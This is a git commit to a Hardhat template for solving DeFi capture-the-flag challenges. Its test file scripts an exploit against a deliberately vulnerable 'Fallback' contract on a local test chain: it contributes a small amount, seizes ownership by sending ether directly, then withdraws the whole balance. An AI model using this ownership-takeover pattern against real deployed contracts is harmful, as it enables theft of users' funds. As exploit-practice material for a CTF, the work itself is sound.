5a3cb8c069901aeef0ab4f15b8bf5ccfe1de139e
eieueo <eieueo@eieueos-MacBook-Pro.local>
2022-11-16 16:02:59 +0700

    first version

--- README.md
+++ README.md
@@ -1,2 +1,9 @@
 # damn-solver-template-js
 Damn Vulnerable DeFi team has created the great DeFi CTF solver project, so I stole it.
+
+# Note
+## example test command
+`npm run-script example-vuln`
+
+## warning
+please verify the dependencies' version in `package.js` before compile contracts
---
+++ test/example-vuln/example-vuln.challenge.js
@@ -0,0 +1,35 @@
+const { ethers, network } = require('hardhat');
+const { expect } = require('chai');
+
+describe('[Challenge] Example Vuln', function () {
+
+    let deployer, attacker;
+    
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, attacker] = await ethers.getSigners();
+        const FallbackFactory = await ethers.getContractFactory('Fallback', deployer);
+        this.target = await FallbackFactory.deploy();
+    });
+
+    it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE */
+        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
+        // Contribute to get into whitelist
+        await this.target.connect(attacker).contribute({value: some_ether});
+        // Takeover the contract's owner by sending some ethers
+        tx = {
+            to: this.target.address,
+            value: some_ether
+        };
+        await attacker.sendTransaction(tx);
+        // Withdraw all ethers in the contract
+        await this.target.connect(attacker).withdraw();
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS */
+        // Attacker should takeover the owner of the contract
+        expect(await this.target.owner()).eq(attacker.address);
+    });
+});
